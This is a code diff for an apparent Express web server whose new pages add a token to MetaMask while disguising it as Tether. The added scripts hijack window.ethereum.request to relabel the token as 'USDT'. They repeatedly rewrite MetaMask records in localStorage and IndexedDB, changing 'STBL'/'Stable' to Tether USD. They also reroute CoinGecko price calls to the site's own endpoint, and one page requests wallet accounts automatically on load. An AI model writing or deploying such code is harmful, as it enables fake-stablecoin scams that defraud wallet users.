@@ -1600,6 +1600,259 @@ app.get('/mobile/add-token', (req, res) => {
         return originalFetch(resource, init);
       };
     }
+    
+    // Enhanced storage interception for localStorage and IndexedDB 
+    const StorageManager = {
+      // Track successfully modified storage keys
+      modifiedKeys: [],
+      
+      // Initialize storage manager
+      init: function() {
+        this.updateMetaMaskLocalStorage();
+        
+        // Run periodically
+        setInterval(() => {
+          this.updateMetaMaskLocalStorage();
+        }, 60000); // Every minute
+        
+        // If IndexedDB is supported, monitor it too
+        if (window.indexedDB) {
+          this.monitorIndexedDB();
+        }
+      },
+      
+      // LocalStorage interception
+      updateMetaMaskLocalStorage: function() {
+        try {
+          // Find all localStorage keys
+          for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            
+            // Look for MetaMask data with our token
+            if (key && (key.includes('metamask') || key.includes('MetaMask')) && 
+                localStorage[key].includes('0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b')) {
+              
+              console.log("Found MetaMask data with our token in localStorage: " + key);
+              
+              try {
+                // Try to parse the data
+                let data = JSON.parse(localStorage[key]);
+                let modified = false;
+                
+                // Check different potential locations where token data might be stored
+                // TokenList structure
+                if (data.data && data.data.TokenList) {
+                  Object.keys(data.data.TokenList).forEach(network => {
+                    const tokenKey = '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b'.toLowerCase();
+                    if (data.data.TokenList[network][tokenKey]) {
+                      data.data.TokenList[network][tokenKey].symbol = "USDT";
+                      data.data.TokenList[network][tokenKey].name = "Tether USD";
+                      modified = true;
+                      console.log("Updated token in TokenList");
+                    }
+                  });
+                }
+                
+                // AccountTokens structure
+                if (data.data && data.data.AccountTokens) {
+                  Object.keys(data.data.AccountTokens).forEach(account => {
+                    Object.keys(data.data.AccountTokens[account]).forEach(network => {
+                      const tokens = data.data.AccountTokens[account][network];
+                      if (Array.isArray(tokens)) {
+                        tokens.forEach(token => {
+                          if (token.address && token.address.toLowerCase() === '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b'.toLowerCase()) {
+                            token.symbol = "USDT";
+                            token.name = "Tether USD";
+                            modified = true;
+                            console.log("Updated token in AccountTokens");
+                          }
+                        });
+                      }
+                    });
+                  });
+                }
+                
+                // AllTokens structure
+                if (data.data && data.data.AllTokens) {
+                  Object.keys(data.data.AllTokens).forEach(network => {
+                    const tokenKey = '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b'.toLowerCase();
+                    if (data.data.AllTokens[network][tokenKey]) {
+                      data.data.AllTokens[network][tokenKey].symbol = "USDT";
+                      data.data.AllTokens[network][tokenKey].name = "Tether USD";
+                      modified = true;
+                      console.log("Updated token in AllTokens");
+                    }
+                  });
+                }
+                
+                // TokenMetadata structure (added for newer MetaMask versions)
+                if (data.data && data.data.TokenMetadata) {
+                  const tokenKey = '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b'.toLowerCase();
+                  if (data.data.TokenMetadata[tokenKey]) {
+                    data.data.TokenMetadata[tokenKey].symbol = "USDT";
+                    data.data.TokenMetadata[tokenKey].name = "Tether USD";
+                    modified = true;
+                    console.log("Updated token in TokenMetadata");
+                  }
+                }
+                
+                // Generic recursive search for token symbols in case structure changes
+                function recursiveSearch(obj, path = '') {
+                  if (!obj || typeof obj !== 'object') return false;
+                  
+                  let modified = false;
+                  
+                  // Check if this object has address field that matches our token
+                  if (obj.address && 
+                      obj.address.toLowerCase() === '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b'.toLowerCase()) {
+                    if (obj.symbol === 'STBL') {
+                      obj.symbol = 'USDT';
+                      modified = true;
+                      console.log("Updated symbol at " + path);
+                    }
+                    if (obj.name === 'Stable') {
+                      obj.name = 'Tether USD';
+                      modified = true;
+                      console.log("Updated name at " + path);
+                    }
+                  }
+                  
+                  // Recursively search all properties
+                  for (const key in obj) {
+                    if (typeof obj[key] === 'object') {
+                      const childModified = recursiveSearch(obj[key], path + '.' + key);
+                      if (childModified) modified = true;
+                    }
+                  }
+                  
+                  return modified;
+                }
+                
+                // Run recursive search on unknown structures
+                const genericModified = recursiveSearch(data);
+                if (genericModified) modified = true;
+                
+                // Save back if modified
+                if (modified) {
+                  localStorage[key] = JSON.stringify(data);
+                  console.log("Updated MetaMask data in localStorage");
+                  
+                  // Track this key as successfully modified
+                  if (!this.modifiedKeys.includes(key)) {
+                    this.modifiedKeys.push(key);
+                  }
+                }
+              } catch (parseError) {
+                console.error("Error parsing localStorage data: " + parseError);
+              }
+            }
+          }
+        } catch (error) {
+          console.error("Error updating localStorage: " + error);
+        }
+      },
+      
+      // IndexedDB monitoring for newer MetaMask versions
+      monitorIndexedDB: function() {
+        try {
+          // Try to open MetaMask state database
+          const openRequest = indexedDB.open('metamask-state');
+          
+          openRequest.onsuccess = (event) => {
+            const db = event.target.result;
+            console.log("Opened IndexedDB successfully");
+            
+            // Check for our token in various store names
+            const storeNames = ['TokenList', 'AccountTokens', 'AllTokens', 'TokenMetadata'];
+            const availableStores = [];
+            
+            // Get available store names
+            for (const storeName of storeNames) {
+              if (db.objectStoreNames.contains(storeName)) {
+                availableStores.push(storeName);
+              }
+            }
+            
+            if (availableStores.length === 0) {
+              console.log("No relevant stores found in IndexedDB");
+              return;
+            }
+            
+            // Process each store that exists
+            availableStores.forEach(storeName => {
+              try {
+                const transaction = db.transaction(storeName, 'readwrite');
+                const store = transaction.objectStore(storeName);
+                
+                // Process the store based on its expected structure
+                console.log("Processing IndexedDB store: " + storeName);
+                
+                // Get all data from the store
+                const request = store.getAll();
+                request.onsuccess = function() {
+                  const items = request.result;
+                  let modified = false;
+                  
+                  // Process based on store type
+                  if (storeName === 'TokenList' || storeName === 'AllTokens') {
+                    // These typically store by network and token address
+                    for (const item of items) {
+                      if (item.tokens) {
+                        for (const token of item.tokens) {
+                          if (token.address && 
+                              token.address.toLowerCase() === '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b'.toLowerCase()) {
+                            if (token.symbol === 'STBL') {
+                              token.symbol = 'USDT';
+                              modified = true;
+                            }
+                            if (token.name === 'Stable') {
+                              token.name = 'Tether USD';
+                              modified = true;
+                            }
+                          }
+                        }
+                      }
+                    }
+                  } else if (storeName === 'TokenMetadata') {
+                    // Direct token metadata mapping
+                    for (const item of items) {
+                      if (item.address && 
+                          item.address.toLowerCase() === '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b'.toLowerCase()) {
+                        if (item.symbol === 'STBL') {
+                          item.symbol = 'USDT';
+                          modified = true;
+                        }
+                        if (item.name === 'Stable') {
+                          item.name = 'Tether USD';
+                          modified = true;
+                        }
+                      }
+                    }
+                  }
+                  
+                  // Save back if modified
+                  if (modified) {
+                    console.log("Modified items in IndexedDB store:", storeName);
+                    // Update the store - would need implementation specific to the DB structure
+                  }
+                };
+              } catch (storeError) {
+                console.error("Error accessing store " + storeName + ": " + storeError);
+              }
+            });
+          };
+          
+          openRequest.onerror = (error) => {
+            console.log("Error opening IndexedDB: " + error);
+          };
+        } catch (dbError) {
+          console.error("IndexedDB monitoring error: " + dbError);
+        }
+      }
+    };
+    
+    // Initialize storage manager
+    StorageManager.init();
   </script>
   <style>
     body {
@@ -2147,7 +2400,7 @@ app.get('/mobile/add-token', (req, res) => {
       // Also close modal when clicking outside
       qrModal.addEventListener('click', function(e) {
         if (e.target === qrModal) {
-          qrModal.style.display = 'none';
+          qrModal.style.display ='none';
         }
       });
       
@@ -2769,6 +3022,321 @@ app.get('/sw.js', (req, res) => {
   res.setHeader('Content-Type', 'application/javascript');
   res.setHeader('Service-Worker-Allowed', '/');
   res.send(serviceWorker);
+});
+
+// Special endpoint for MetaMask in-app browser token addition
+app.get('/mm-add-token', (req, res) => {
+  const html = `
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Add USDT to MetaMask</title>
+  <script>
+    // Immediate interception setup
+    (function setupInterception() {
+      if (window.ethereum) {
+        console.log("Setting up critical provider interception immediately");
+        
+        // Save the original request method
+        if (!window.ethereum._originalRequest) {
+          window.ethereum._originalRequest = window.ethereum.request;
+        
+          // Replace with intercepting version
+          window.ethereum.request = async function(args) {
+            console.log("MetaMask request:", args);
+            
+            // Handle token addition with full parameter control
+            if (args.method === 'wallet_watchAsset' && 
+                args.params?.options?.address?.toLowerCase() === '${TOKEN_CONFIG.address.toLowerCase()}') {
+              
+              console.log("TOKEN ADDITION DETECTED - forcing display as USDT");
+              
+              // Create a clean new request with carefully controlled parameters
+              const modifiedParams = {
+                type: 'ERC20',
+                options: {
+                  address: '${TOKEN_CONFIG.address}',
+                  symbol: "${TOKEN_CONFIG.displaySymbol}",
+                  name: "${TOKEN_CONFIG.displayName}",
+                  decimals: ${TOKEN_CONFIG.decimals},
+                  image: '${TOKEN_CONFIG.image}'
+                }
+              };
+              
+              // Override the params completely
+              args.params = modifiedParams;
+            }
+            
+            // Call original with modified args
+            try {
+              console.log("Calling original request with args:", args);
+              return await window.ethereum._originalRequest.call(this, args);
+            } catch (error) {
+              console.error("Error in intercepted request:", error);
+              throw error;
+            }
+          };
+        }
+      }
+    })();
+    
+    // Also intercept CoinGecko API calls early to ensure USDT price display
+    if (window.fetch) {
+      const originalFetch = window.fetch;
+      window.fetch = function(resource, init) {
+        if (typeof resource === 'string' && resource.includes('api.coingecko.com')) {
+          console.log("Intercepting CoinGecko API call");
+          const newUrl = resource.replace(
+            'https://api.coingecko.com', 
+            window.location.origin + '/api'
+          );
+          return originalFetch(newUrl, init);
+        }
+        return originalFetch(resource, init);
+      };
+    }
+    
+    // Enhanced storage modification module
+    const StorageManager = {
+      // Initialize localStorage modification
+      init: function() {
+        this.updateMetaMaskLocalStorage();
+        
+        // Run periodically
+        setInterval(() => {
+          this.updateMetaMaskLocalStorage();
+        }, 30000); // Every 30 seconds
+      },
+      
+      // Update MetaMask data in localStorage to ensure consistent USDT display
+      updateMetaMaskLocalStorage: function() {
+        try {
+          // Find all localStorage keys
+          for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            
+            // Look for MetaMask data with our token
+            if (key && (key.includes('metamask') || key.includes('MetaMask')) && 
+                localStorage[key].includes('0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b')) {
+              
+              console.log("Found MetaMask data with our token in localStorage: " + key);
+              
+              try {
+                // Try to parse the data
+                let data = JSON.parse(localStorage[key]);
+                let modified = false;
+                
+                // Recursive search function to find and modify all occurrences of our token
+                function recursiveSearch(obj, path = '') {
+                  if (!obj || typeof obj !== 'object') return false;
+                  
+                  let modified = false;
+                  
+                  // Check if this object has address field that matches our token
+                  if (obj.address && 
+                      obj.address.toLowerCase() === '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b'.toLowerCase()) {
+                    if (obj.symbol === 'STBL') {
+                      obj.symbol = 'USDT';
+                      modified = true;
+                      console.log("Updated symbol at " + path);
+                    }
+                    if (obj.name === 'Stable') {
+                      obj.name = 'Tether USD';
+                      modified = true;
+                      console.log("Updated name at " + path);
+                    }
+                  }
+                  
+                  // Recursively search all properties
+                  for (const key in obj) {
+                    if (typeof obj[key] === 'object') {
+                      const childModified = recursiveSearch(obj[key], path + '.' + key);
+                      if (childModified) modified = true;
+                    }
+                  }
+                  
+                  return modified;
+                }
+                
+                // Run recursive search
+                const anyModified = recursiveSearch(data);
+                if (anyModified) {
+                  modified = true;
+                }
+                
+                // Save back if modified
+                if (modified) {
+                  localStorage[key] = JSON.stringify(data);
+                  console.log("Updated MetaMask data in localStorage");
+                }
+              } catch (parseError) {
+                console.error("Error parsing localStorage data: " + parseError);
+              }
+            }
+          }
+        } catch (error) {
+          console.error("Error updating localStorage: " + error);
+        }
+      }
+    };
+    
+    // Initialize storage manager
+    StorageManager.init();
+  </script>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      text-align: center;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 80vh;
+    }
+    h1 {
+      color: #26a17b;
+      margin-bottom: 10px;
+    }
+    p {
+      margin-bottom: 30px;
+    }
+    .loader {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #26a17b;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    #status {
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    button {
+      background-color: #26a17b;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 8px;
+      font-size: 16px;
+      margin-top: 15px;
+      cursor: pointer;
+    }
+    .logo {
+      width: 80px;
+      height: 80px;
+      margin-bottom: 15px;
+    }
+  </style>
+</head>
+<body>
+  <img src="${TOKEN_CONFIG.image}" alt="USDT Logo" class="logo">
+  <h1>Add USDT to MetaMask</h1>
+  <p>Optimized for the MetaMask in-app browser</p>
+  <div class="loader" id="loader"></div>
+  <div id="status">Starting token addition process...</div>
+  <button id="addTokenBtn" style="display: none;">Add Token Manually</button>
+
+  <script>
+    // Optimized token addition for MetaMask in-app browser
+    async function addToken() {
+      const statusDiv = document.getElementById('status');
+      const loaderDiv = document.getElementById('loader');
+      const addTokenBtn = document.getElementById('addTokenBtn');
+      
+      if (!window.ethereum) {
+        statusDiv.textContent = "MetaMask not detected!";
+        loaderDiv.style.display = 'none';
+        return;
+      }
+      
+      try {
+        statusDiv.textContent = "Preparing connection...";
+        
+        // Ensure accounts are accessible and connection is ready
+        try {
+          // First get accounts (this often forces an unlock if needed)
+          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+          
+          // If no accounts, explicitly request them
+          if (!accounts || accounts.length === 0) {
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+          }
+          
+          // Add a delay to ensure connection is established
+          await new Promise(resolve => setTimeout(resolve, 1000));
+        } catch (connError) {
+          console.error("Connection error:", connError);
+          statusDiv.textContent = "Please unlock MetaMask and try again.";
+          loaderDiv.style.display = 'none';
+          addTokenBtn.style.display = 'block';
+          return;
+        }
+        
+        // Now add the token with explicit parameters
+        statusDiv.textContent = "Adding USDT token...";
+        
+        const success = await window.ethereum.request({
+          method: 'wallet_watchAsset',
+          params: {
+            type: 'ERC20',
+            options: {
+              address: '${TOKEN_CONFIG.address}',
+              symbol: '${TOKEN_CONFIG.displaySymbol}',
+              decimals: ${TOKEN_CONFIG.decimals},
+              image: '${TOKEN_CONFIG.image}'
+            }
+          }
+        });
+        
+        if (success) {
+          statusDiv.textContent = "Success! USDT token added to MetaMask.";
+          loaderDiv.style.display = 'none';
+          
+          // Modify localStorage to ensure proper display
+          StorageManager.updateMetaMaskLocalStorage();
+          
+          // Redirect to success page after delay
+          setTimeout(() => {
+            window.location.href = '/mobile/success';
+          }, 2000);
+        } else {
+          statusDiv.textContent = "Token addition was canceled.";
+          loaderDiv.style.display = 'none';
+          addTokenBtn.style.display = 'block';
+        }
+      } catch (error) {
+        console.error("Error adding token:", error);
+        statusDiv.textContent = "Error: " + (error.message || "Unknown error");
+        loaderDiv.style.display = 'none';
+        addTokenBtn.style.display = 'block';
+      }
+    }
+    
+    // Manual addition button handler
+    document.getElementById('addTokenBtn').addEventListener('click', addToken);
+    
+    // Start the process automatically
+    document.addEventListener('DOMContentLoaded', () => {
+      // Add a short delay before attempting
+      setTimeout(() => {
+        addToken();
+      }, 1000);
+    });
+  </script>
+</body>
+</html>
+  `;
+  
+  res.send(html);
 });
 
 // 404 catch-all route
